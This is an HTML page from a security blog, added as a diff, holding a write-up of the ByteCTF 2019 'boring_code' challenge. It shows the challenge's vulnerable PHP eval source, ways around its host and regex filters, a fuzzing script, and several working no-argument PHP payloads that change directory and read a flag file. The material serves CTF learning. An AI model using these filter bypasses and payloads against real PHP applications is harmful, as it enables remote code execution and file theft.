@@ -1,0 +1,430 @@
+<html>
+
+<head>
+  <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>PHP 无参数实现 RCE - boring_code | 3ND</title>
+<link rel="shortcut icon" href="https://github.com/inspiringz/inspiringz.github.io/favicon.ico?v=1627821474317">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://github.com/inspiringz/inspiringz.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="PHP 无参数实现 RCE - boring_code | 3ND - Atom Feed" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="bytectf boring_code
+F12 注释中可以看到 flag 在 index.php 文件中，而/code/index.php中直接给出了源码：
+&lt;?php
+function is_valid_url($url) {
+  ..." />
+    <meta name="keywords" content="PHP,Writeup,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <!--<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>-->
+    <script src="/media/highlight.min.js"></script>
+</head>
+
+<body>
+  <div class="main">
+    <div class="main-content">
+      <div class="site-header">
+  <a href="https://github.com/inspiringz/inspiringz.github.io">
+  <img class="avatar" src="https://github.com/inspiringz/inspiringz.github.io/images/avatar.png?v=1627821474317" alt="">
+  </a>
+  <h1 class="site-title">
+    3ND
+  </h1>
+  <p class="site-description">
+    夏が終わった
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/inspiringz" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              PHP 无参数实现 RCE - boring_code
+            </h2>
+            <div class="post-info">
+              <span>
+                2019-11-25
+              </span>
+              <span>
+                8 min read
+              </span>
+              <span class="page-view" key="20191125084748" title="PHP 无参数实现 RCE - boring_code">
+              </span>
+              
+                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/php/" class="post-tag">
+                  # PHP
+                </a>
+                
+                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/writeup/" class="post-tag">
+                  # Writeup
+                </a>
+                
+                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/ctf/" class="post-tag">
+                  # CTF
+                </a>
+                
+            </div>
+            
+                <div class="post-content-wrapper">
+                  <div class="post-content">
+                    <h2 id="bytectf-boring_code">bytectf boring_code</h2>
+<p>F12 注释中可以看到 flag 在 <code>index.php</code> 文件中，而<code>/code/index.php</code>中直接给出了源码：</p>
+<pre><code class="language-php">&lt;?php
+function is_valid_url($url) {
+    if (filter_var($url, FILTER_VALIDATE_URL)) {
+        if (preg_match('/data:\/\//i', $url)) {
+            return false;
+        }
+        return true;
+    }
+    return false;
+}
+
+if (isset($_POST['url'])){
+    $url = $_POST['url'];
+    if (is_valid_url($url)) {
+        $r = parse_url($url);
+        if (preg_match('/baidu\.com$/', $r['host'])) {
+            $code = file_get_contents($url);
+            if (';' === preg_replace('/[a-z]+\((?R)?\)/', NULL, $code)) {
+                if (preg_match('/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i', $code)) {
+                    echo 'bye~';
+                } else {
+                    eval($code);
+                }
+            }
+        } else {
+            echo &quot;error: host not allowed&quot;;
+        }
+    } else {
+        echo &quot;error: invalid url&quot;;
+    }
+}else{
+    highlight_file(__FILE__);
+}
+</code></pre>
+<p>首先会先用正则判断我们传入的 <code>URL</code>，通过后会 <code>file_get_contents</code> 请求 URL，同时对返回的内容进行了限制，最后 eval 执行。这里很容易在网上找到两篇关于 <code>parse_url</code> 和 <code>file_get_contents</code> 进行 SSRF 的文章：</p>
+<ul>
+<li>
+<p><a href="https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51">PHP SSRF Techniques</a></p>
+</li>
+<li>
+<p><a href="https://paper.seebug.org/561/">PHP trick（代码审计关注点）</a></p>
+</li>
+</ul>
+<p>文章中是给出了两种方式：parse_url 和 curl、file_get_contents 和  PHP 伪协议。其中伪协议靠的是 data 协议中类似 <code>data:text/plain</code>，其 <strong>:</strong> 后的内容可以任意替换，而题目刚好 WAF 了 data，其余的协议又没有这个特性。针对第一部分有如下三种解决方案:</p>
+<ol>
+<li>
+<p>氪金注册域名 <code>evilbaidu.com</code>;</p>
+</li>
+<li>
+<p>使用 ftp 协议，<code>ftp://ip:port,baidu.com:80/filename.txt</code>;</p>
+</li>
+<li>
+<p>百度任意跳转的漏洞 post.baidu.com; （<a href="https://www.4xseo.com/marketing/1280/#title-0">参考链接</a>）</p>
+</li>
+</ol>
+<p>file_get_contents 获取到的内容会进入正则替换，<code>?R</code> 循环匹配并替换<code>[a-z]()</code> 为空。最后剩下一个;，即我们的 payload 必须要是 <code>a(b(c()));</code> 这样的 PHP 函数嵌套的形式。这里限制了两点：</p>
+<ol>
+<li>
+<p>函数名不能带有 <code>_</code>；</p>
+</li>
+<li>
+<p>函数内不能传入常量参数；</p>
+</li>
+</ol>
+<p>fuzz 可以使用的 PHP 内置函数：</p>
+<pre><code class="language-php">&lt;?php
+// var_dump(gettype(get_defined_functions())); -&gt; array
+// var_dump(count(get_defined_functions()[&quot;internal&quot;])); -&gt; 1276
+// var_dump(preg_match('/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i', '1')); -&gt; int(0)
+
+$func = get_defined_functions()[&quot;internal&quot;];
+$_func = array();
+$_i = 0;
+
+foreach ($func as $key =&gt; $value) {
+    if (!preg_match('/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i', $value)) {
+        $_func[$_i] = $value;
+        $_i++;
+    }
+}
+
+print_r($_func);
+</code></pre>
+<p>当前位置为 <code>/code/index.php</code>，flag 位于 <code>index.php</code>想办法构造出上层目录文件的绝对路径，然后去读取它（因为 path 被过滤，无法用 realpath() 函数来返回绝对路径）；或可以采用把目录切换到上级目录，然后再读取。可以构造出 <code>.</code> 这个字符，来代表当前所在的目录。因为只有一个字符，因此可以借助 <code>ord()</code> 和 <code>chr()</code> 函数来构造。</p>
+<h3 id="time">time()</h3>
+<p>chr() 函数需要传入一个数字，并取模 256 后根据 ASCII 码返回对应的字符。这里我们可以使用 <code>time()</code> 函数来返回当前时间戳数字，当 time() 为 46 时，chr(46)是 <code>.</code> 。time() 循环一轮，即 256 秒是 4 分钟左右，只要在当前时间戳取模为 46 的时候发送请求就能获取到 <code>.</code> 字符。</p>
+<pre><code class="language-php"># var_dump(scandir('.'));
+array(3) {
+  [0]=&gt; string(1) &quot;.&quot;
+  [1]=&gt; string(2) &quot;..&quot;
+  [2]=&gt; string(9) &quot;index.php&quot;
+}
+</code></pre>
+<p><code>next()</code> 函数来使数组指针后移，使其指向 <code>..</code>，即上一层目录。然后就可以套一层chdir()来切换当前目录了。</p>
+<pre><code class="language-php">chdir(next(scandir(chr(ord(chr(time()))))))
+</code></pre>
+<p>切换到上层目录后，即可开始读取 index.php 的内容。首先显示选取到 index.php 这个文件，和上面的方法一样，用 time() 以及 chr() 构造出字符.，然后用 scandir() 来读取目录下的文件内容：</p>
+<pre><code class="language-php">array(4) {
+  [0]=&gt; string(1) &quot;.&quot;
+  [1]=&gt; string(2) &quot;..&quot;
+  [2]=&gt; string(4) &quot;code&quot;
+  [3]=&gt; string(9) &quot;index.php&quot;
+}
+</code></pre>
+<p>注意这里返回数组中，是按照文件名首字母的顺序来排序的，因此 index.php 会在最后一个，用 end() 函数来获取数组的最后一个元素，即取到了index.php。</p>
+<p>之后使用 file() 函数来读取文件内容。要注意的是，PHP 的很多文件操作函数返回或入参是文件句柄，这在本题中是无法使用的。file() 函数的返回值是数组，而 echo() 和 print() 函数无法输出数组的内容，这里我想到了使用 PHP 序列化函数 <code>serialize()</code> 来将数组的值序列化为字符串后输出。</p>
+<pre><code class="language-php">echo(serialize(file(end(scandir(chr(ord(chr(time()))))))))
+</code></pre>
+<p>最终 payload:</p>
+<pre><code class="language-php">echo(serialize(file(end(scandir(chr(ord(chr(time(chdir(next(scandir(chr(ord(chr(time())))))))))))))));
+</code></pre>
+<h3 id="phpversion">phpversion()</h3>
+<figure data-type="image" tabindex="1"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-11-25-10-04-13.png" alt="" loading="lazy"></figure>
+<p>构造出 <code>.</code> 即可扫描当前目录：</p>
+<pre><code class="language-php">var_dump(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))));
+</code></pre>
+<p>之后就是使用 chdir 函数进行跳到上一级目录，但是跳完还有一个问题，就是该怎么再次获取一个 <code>.</code> 出来，chdir 函数的返回值是布尔值，那么之后就将布尔值 <code>True</code> 作为参数放在 fuzzer 中看能得到什么结果，最后 fuzz 轮次不一样时发现 time 函数返回的结果也不一样，随后查了一下手册，便意识到可以使用这种方式来进行构造一个 46 出来，所以构造出如下 payload:</p>
+<pre><code class="language-php">localtime(time(1))
+</code></pre>
+<p>最终 payload:</p>
+<pre><code class="language-php">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))))))))))))));
+</code></pre>
+<h3 id="localeconv">localeconv()</h3>
+<p><code>localeconv()</code> 函数返回一包含本地数字及货币格式信息的数组。其返回的数组元素中包含 [decimal_point] - 小数点字符。</p>
+<pre><code class="language-php">php &gt; var_dump(localeconv());
+array(18) {
+  [&quot;decimal_point&quot;]=&gt; string(1) &quot;.&quot;
+  [&quot;thousands_sep&quot;]=&gt; ...}
+</code></pre>
+<p><code>pos()</code> 输出数组中的当前元素的值：</p>
+<pre><code class="language-php">php &gt; var_dump(pos(localeconv()));
+string(1) &quot;.&quot;
+</code></pre>
+<p>Payload:</p>
+<pre><code class="language-php">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));
+</code></pre>
+<h3 id="hash-特性">hash 特性</h3>
+<p>Payload:</p>
+<pre><code class="language-php">readfile(end(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))))))))));
+</code></pre>
+<p>原理：<code>hebrevc(crypt(arg))</code> 可以随机生成一个 hash 值 第一个字符随机是 <code>$</code>(大概率) 或者 <code>.</code>(小概率) 然后通过ord、chr只取第一个字符</p>
+<pre><code class="language-php">php &gt; var_dump(hebrevc(crypt(phpversion())));
+string(34) &quot;.$1$zEHuomrO$cXgJopOzWROGwYb.gyDRl&quot;
+php &gt; var_dump(chr(ord(&quot;.$1$zEHuomrO$cXgJopOzWROGwYb.gyDRl&quot;)));
+string(1) &quot;.&quot;
+</code></pre>
+<p>Payload 2:</p>
+<p><code>crypt(serialize(array()))</code> 原理同上，用于生成 <code>.</code>。</p>
+<pre><code class="language-php">if(chdir(next(scandir(chr(ord(strrev(crypt(serialize(array())))))))))readfile(end(scandir(chr(ord(strrev(crypt(serialize(array()))))))));
+</code></pre>
+<p>fuzz fliter：</p>
+<pre><code class="language-php">&lt;?php
+error_reporting(0);
+// var_dump(gettype(get_defined_functions())); -&gt; array
+// var_dump(count(get_defined_functions()[&quot;internal&quot;])); -&gt; 1276
+// var_dump(preg_match('/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i', '1')); -&gt; int(0)
+
+$func = get_defined_functions()[&quot;internal&quot;];
+$_func = array();
+$_i = 0;
+
+foreach ($func as $key =&gt; $value) {
+    if (!preg_match('/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i', $value)) {
+        $_func[$_i] = $value;
+        $_i++;
+    }
+}
+
+// print_r($_func);
+
+try {
+    foreach ($_func as $f) { 
+        if(!is_null($f())) {
+            echo $f.&quot;\n&quot;;
+        }
+        // if (var_dump(print_r($f(chr(46))))) {
+        //     echo $f;
+        // }
+    }
+} catch (Throwable $th) {
+    //throw $th;
+}
+</code></pre>
+<p>- <strong>参考</strong> -</p>
+<p>[1] <a href="http://zeroyu.xyz/2019/09/14/2019-bytectf-writeup/">2019 bytectf writeup</a></p>
+<p>[2] <a href="https://github.red/bytectf-web1-boring_code-writeup/">Byte CTF web1 boring_code Writeup</a></p>
+
+                  </div>
+                  <div class="toc-container">
+                    <div style="position: sticky;
+                    top: 20px;">
+                    <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#bytectf-boring_code">bytectf boring_code</a>
+<ul>
+<li><a href="#time">time()</a></li>
+<li><a href="#phpversion">phpversion()</a></li>
+<li><a href="#localeconv">localeconv()</a></li>
+<li><a href="#hash-%E7%89%B9%E6%80%A7">hash 特性</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+                  </div>
+                  </div>
+                </div>
+          </article>
+        </div>
+
+        
+          <div class="nearby-post" style="padding: 24px 32px;">
+            <div class="prev-post" style="float: left;">
+              <div class="aaa" style="
+              margin-bottom: 24px;
+              color: #343a40;
+              font-weight: lighter;text-align: left;">上一篇</div>
+              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-11-25-Redis-unauthenticate-exploit/">
+                <h3 class="post-title" style="text-align: left;">
+                  Do Evil Via Redis Unauthorized Access
+                </h3>
+              </a>
+            </div>
+            <div class="next-posts" style="float: right;">
+              <div class="aaa" style="
+              margin-bottom: 24px;
+              color: #343a40;
+              font-weight: lighter; text-align: right;">下一篇</div>
+              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-11-23-Memory-Forensics-in-CTF/">
+                <h3 class="post-title" style="
+                text-align: right;">
+                  CTF 中常见的内存取证工具使用方法
+                </h3>
+              </a>
+            </div>
+          </div>
+          
+
+                
+
+                                <div class="site-footer">
+  
+  <a class="rss" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+    </div>
+  </div>
+
+  <script>
+    hljs.highlightAll();
+
+    let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+    // This should probably be throttled.
+    // Especially because it triggers during smooth scrolling.
+    // https://lodash.com/docs/4.17.10#throttle
+    // You could do like...
+    // window.addEventListener("scroll", () => {
+    //    _.throttle(doThatStuff, 100);
+    // });
+    // Only not doing it here to keep this Pen dependency-free.
+
+    window.addEventListener("scroll", event => {
+      let fromTop = window.scrollY;
+
+      mainNavLinks.forEach((link, index) => {
+        let section = document.getElementById(decodeURI(link.hash).substring(1));
+        let nextSection = null
+        if (mainNavLinks[index + 1]) {
+          nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+        }
+        if (section.offsetTop <= fromTop) {
+          if (nextSection) {
+            if (nextSection.offsetTop > fromTop) {
+              link.classList.add("current");
+            } else {
+              link.classList.remove("current");
+            }
+          } else {
+            link.classList.add("current");
+          }
+        } else {
+          link.classList.remove("current");
+        }
+      });
+    });
+  </script>
+<script src="/media/view-support.js"></script>
+<script>
+  window.Lazyload.js(['https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js', '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js'], function () {
+    var pageview = window.pageview(AV, {
+      appId: 'HRVNDkHV80Fpk9M8c5GQqjwy-gzGzoHsz',
+      appKey: 'nsyqncNCSWSOkkns1wvDlUrh',
+      appClass: 'Gridea',
+    });
+    $('.page-view').each(function () {
+      var $this = $(this);
+      var key = $this.attr('key');
+      var title = $this.attr('title');
+      pageview.increase(key, title, function(view) {
+        $("[key='" + key +"']").text(view+' views');
+      });
+    });
+  });
+</script>
+
+</body>
+
+</html>
